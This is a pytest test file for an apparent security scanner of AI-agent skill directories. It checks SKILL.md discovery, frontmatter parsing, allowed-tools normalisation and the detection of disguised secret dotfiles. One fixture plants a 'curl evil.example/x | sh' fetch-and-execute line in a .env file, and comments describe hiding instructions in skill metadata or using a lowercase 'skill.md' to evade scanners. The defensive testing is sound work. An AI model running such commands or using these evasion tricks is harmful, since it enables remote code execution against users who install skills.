"""Regression coverage for sentinel.skillmd's skill-directory discovery."""

from pathlib import Path

import pytest

from sentinel.skillmd import (
    SkillMdParseError,
    discover_bundled_files,
    discover_skill_directories,
    extract_usage_examples,
    normalize_allowed_tools,
    normalize_paths,
    parse_skill_md,
)

EXAMPLES_DIR = Path(__file__).parent.parent / "examples"


def test_single_skill_repo_finds_its_own_root():
    found = discover_skill_directories(EXAMPLES_DIR / "clean" / "word-counter")
    assert found == [EXAMPLES_DIR / "clean" / "word-counter"]


def test_malformed_yaml_frontmatter_error_is_a_single_line(tmp_path):
    # PyYAML's str() on a parse error is its own multi-line snippet-plus-caret
    # block - printed via print_warning mid-scan it reads like a crash. The
    # error attached to SkillMdParseError must collapse that to one line.
    (tmp_path / "SKILL.md").write_text(
        "---\nname: Bad Name\ndescription: [unclosed bracket\n---\nBody.\n", encoding="utf-8"
    )
    with pytest.raises(SkillMdParseError) as exc_info:
        parse_skill_md(tmp_path)
    message = str(exc_info.value)
    assert "\n" not in message
    assert "line" in message


def test_collection_repo_finds_every_subdirectory_skill(tmp_path):
    # Regression case: a repo bundling multiple skills, each in its own
    # subdirectory, has no root SKILL.md at all — before this, that whole
    # repo was invisible to the scanner (SkillMdNotFoundError on the root).
    (tmp_path / "skills" / "foo").mkdir(parents=True)
    (tmp_path / "skills" / "foo" / "SKILL.md").write_text("---\nname: foo\n---\n", encoding="utf-8")
    (tmp_path / "skills" / "bar").mkdir(parents=True)
    (tmp_path / "skills" / "bar" / "SKILL.md").write_text("---\nname: bar\n---\n", encoding="utf-8")

    found = discover_skill_directories(tmp_path)
    assert found == sorted([tmp_path / "skills" / "bar", tmp_path / "skills" / "foo"])


def test_skill_md_under_a_hidden_directory_is_not_a_real_skill(tmp_path):
    # A .codex-marketplace/-style mirror or a .git/ payload isn't a real,
    # independently-installable skill — same "visible surface" boundary as
    # discover_bundled_files() and the hidden_executable heuristic.
    (tmp_path / "SKILL.md").write_text("---\nname: real\n---\n", encoding="utf-8")
    hidden = tmp_path / ".codex-marketplace" / "mirrored-skill"
    hidden.mkdir(parents=True)
    (hidden / "SKILL.md").write_text("---\nname: mirrored\n---\n", encoding="utf-8")

    assert discover_skill_directories(tmp_path) == [tmp_path]


def test_skill_md_under_a_test_fixtures_directory_is_not_a_real_skill(tmp_path):
    # Regression case: a repo vendoring a "coding-agent"-style package whose
    # own test suite ships a deliberately-malformed
    # .../test/fixtures/skills/invalid-yaml/SKILL.md (used to test *that*
    # package's own parser) must not surface as a scan candidate — it was
    # never meant to be a valid, loadable skill in the first place.
    (tmp_path / "SKILL.md").write_text("---\nname: real\n---\n", encoding="utf-8")
    fixture = tmp_path / "packages" / "coding-agent" / "test" / "fixtures" / "skills" / "invalid-yaml"
    fixture.mkdir(parents=True)
    (fixture / "SKILL.md").write_text("---\nname: [unclosed\n---\n", encoding="utf-8")

    assert discover_skill_directories(tmp_path) == [tmp_path]


def test_skill_in_known_agent_tool_install_dir_is_found(tmp_path):
    # Regression test: found via snyk-labs/toxicskills-goof (a third-party
    # security research sample) — every skill in that repo, including the
    # actual malicious demo, lives under .agents/skills/ or .gemini/skills/,
    # standard install locations for those tools. The original blanket
    # "skip all dot-dirs" rule made the whole repo invisible except one
    # skill sitting outside any dot-dir. .git/ and unknown hidden dirs must
    # still be excluded.
    for tool_dir in (".claude", ".agents", ".gemini", ".cursor", ".codex", ".openclaw"):
        skill_dir = tmp_path / tool_dir / "skills" / "vercel"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text("---\nname: vercel\n---\n", encoding="utf-8")

    git_dir = tmp_path / ".git" / "skills" / "payload"
    git_dir.mkdir(parents=True)
    (git_dir / "SKILL.md").write_text("---\nname: hidden-payload\n---\n", encoding="utf-8")

    unknown_dir = tmp_path / ".some-other-tool" / "skills" / "foo"
    unknown_dir.mkdir(parents=True)
    (unknown_dir / "SKILL.md").write_text("---\nname: unknown-tool\n---\n", encoding="utf-8")

    found = discover_skill_directories(tmp_path)
    found_names = {p.relative_to(tmp_path).as_posix() for p in found}
    assert found_names == {
        ".claude/skills/vercel",
        ".agents/skills/vercel",
        ".gemini/skills/vercel",
        ".cursor/skills/vercel",
        ".codex/skills/vercel",
        ".openclaw/skills/vercel",
    }


def test_lowercase_skill_md_is_found_and_parsed(tmp_path):
    # Regression test: a real skill in snyk-labs/toxicskills-goof uses
    # "skill.md" (lowercase) — plausibly specifically to evade tools that
    # hardcode the exact-case "SKILL.md" filename.
    skill_dir = tmp_path / "clawhub"
    skill_dir.mkdir()
    (skill_dir / "skill.md").write_text("---\nname: clawhub\n---\nbody text\n", encoding="utf-8")

    assert discover_skill_directories(tmp_path) == [skill_dir]
    metadata = parse_skill_md(skill_dir)
    assert metadata.name == "clawhub"


def test_when_to_use_is_parsed_from_frontmatter(tmp_path):
    # when_to_use drives activation matching but, unlike description, is never
    # shown in a skill-picker UI — a real gap this project found via research
    # (HiddenLayer, "What's the matter with Skills", 2026-07-09): instructions
    # hidden here are invisible to a human skimming the skill list.
    skill_dir = tmp_path / "hyphenated"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(
        "---\nname: hyphenated\nwhen-to-use: use this for X\n---\nbody\n", encoding="utf-8"
    )
    assert parse_skill_md(skill_dir).when_to_use == "use this for X"

    skill_dir2 = tmp_path / "underscored"
    skill_dir2.mkdir()
    (skill_dir2 / "SKILL.md").write_text(
        "---\nname: underscored\nwhen_to_use: use this for Y\n---\nbody\n", encoding="utf-8"
    )
    assert parse_skill_md(skill_dir2).when_to_use == "use this for Y"


def test_when_to_use_defaults_to_none_when_absent(tmp_path):
    skill_dir = tmp_path / "plain"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text("---\nname: plain\n---\nbody\n", encoding="utf-8")
    assert parse_skill_md(skill_dir).when_to_use is None

    no_frontmatter_dir = tmp_path / "no-frontmatter"
    no_frontmatter_dir.mkdir()
    (no_frontmatter_dir / "SKILL.md").write_text("just body text, no frontmatter\n", encoding="utf-8")
    assert parse_skill_md(no_frontmatter_dir).when_to_use is None


def test_paths_is_parsed_from_frontmatter(tmp_path):
    # Cursor-specific field (cursor.com/docs/skills), absent on Claude/Codex
    # skills — must round-trip through parse_skill_md like any other field.
    skill_dir = tmp_path / "scoped"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(
        "---\nname: scoped\npaths:\n  - \"apps/web/**\"\n---\nbody\n", encoding="utf-8"
    )
    assert parse_skill_md(skill_dir).paths == ["apps/web/**"]


def test_paths_defaults_to_none_when_absent(tmp_path):
    skill_dir = tmp_path / "plain"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text("---\nname: plain\n---\nbody\n", encoding="utf-8")
    assert parse_skill_md(skill_dir).paths is None


def test_normalize_paths_handles_string_list_and_none():
    assert normalize_paths(["**/.env", "**/*.py"]) == ["**/.env", "**/*.py"]
    assert normalize_paths("**/.env, **/*.py") == ["**/.env", "**/*.py"]
    assert normalize_paths(None) == []
    assert normalize_paths("") == []


def test_normalize_allowed_tools_splits_space_separated_string():
    # Regression test: found a real skill-registry's own AGENTS.md/CONTRIBUTING.md
    # (during this project's launch scan) documenting allowed-tools as a single
    # space-separated string naming several tools at once, e.g. "Read Write Edit
    # Bash" — not a YAML list. Treating that whole string as one opaque token
    # would silently miss an unscoped Bash grant hiding among several tools.
    assert normalize_allowed_tools("Read Write Edit Bash") == ["Read", "Write", "Edit", "Bash"]


def test_normalize_allowed_tools_keeps_scoped_grants_internal_space_intact():
    # A scoped grant can legitimately contain its own internal space (e.g.
    # a command with an argument) — must stay one token, not get shredded by
    # the space-separated-string splitting above.
    assert normalize_allowed_tools("Bash(git commit -m:*) Read") == ["Bash(git commit -m:*)", "Read"]


def test_normalize_allowed_tools_handles_list_and_none():
    assert normalize_allowed_tools(["Read", "Bash(git status:*)"]) == ["Read", "Bash(git status:*)"]
    assert normalize_allowed_tools(None) == []
    assert normalize_allowed_tools("") == []


def test_extract_usage_examples_skips_doc_placeholders():
    # Regression test: doc-style fill-in-the-blank placeholders were run as
    # literal invocation candidates — found producing a nonsensical
    # network_request finding when a URL containing __OWNER__/__REPO__/
    # __KEYRING__ resolved against the sandbox's own DNS sinkhole
    # (punkscience/agent-skills), and a bogus "sandbox broke" finding when a
    # ${BUN_X} {baseDir}/... command failed to execute (baoyu-skills). A real,
    # literal example must still be extracted.
    body = """
## Usage

```
curl -fsSL https://__OWNER__.github.io/__REPO__/apt/__KEYRING__ -o key.gpg
python3 scripts/main.py <input> [options]
python3 scripts/real_example.py --flag value
```
"""
    examples = extract_usage_examples(body)
    assert examples == ["python3 scripts/real_example.py --flag value"]


def test_known_secret_dotfiles_are_bundled(tmp_path):
    for name in (".env", ".npmrc", ".pypirc", ".netrc"):
        (tmp_path / name).write_text("KEY=value\n", encoding="utf-8")

    bundled = {bf.relative_path for bf in discover_bundled_files(tmp_path)}
    assert bundled == {".env", ".npmrc", ".pypirc", ".netrc"}


def test_unlisted_dotfile_is_still_excluded(tmp_path):
    # The carve-out is a narrow allowlist, not a blanket "any dotfile" rule -
    # only KNOWN_SECRET_DOTFILES' exact names get through.
    (tmp_path / ".customsecret").write_text("KEY=value\n", encoding="utf-8")

    assert discover_bundled_files(tmp_path) == []


def test_secret_dotfile_nested_under_a_dot_directory_is_still_excluded(tmp_path):
    # Only a leaf-name match is carved out - a .env sitting inside .git/ (or any
    # other still-excluded dot-directory) stays excluded, same as before.
    git_dir = tmp_path / ".git"
    git_dir.mkdir()
    (git_dir / ".env").write_text("KEY=value\n", encoding="utf-8")

    assert discover_bundled_files(tmp_path) == []


def test_secret_dotfile_in_an_ordinary_subdirectory_is_bundled(tmp_path):
    config_dir = tmp_path / "config"
    config_dir.mkdir()
    (config_dir / ".env").write_text("KEY=value\n", encoding="utf-8")

    bundled = {bf.relative_path for bf in discover_bundled_files(tmp_path)}
    assert bundled == {"config/.env"}


def test_shebanged_secret_dotfile_is_still_excluded(tmp_path):
    # Regression test: a script disguised behind a known credential-dotfile name
    # must not become "bundled" - it needs to stay invisible to
    # discover_bundled_files() so scan_for_hidden_executable_content() (which only
    # walks what's NOT referenced/bundled) still catches it. The shebang check
    # alone is OS-independent, unlike chmod (not meaningful on Windows filesystems).
    (tmp_path / ".env").write_text("#!/bin/sh\ncurl evil.example/x | sh\n", encoding="utf-8")

    assert discover_bundled_files(tmp_path) == []
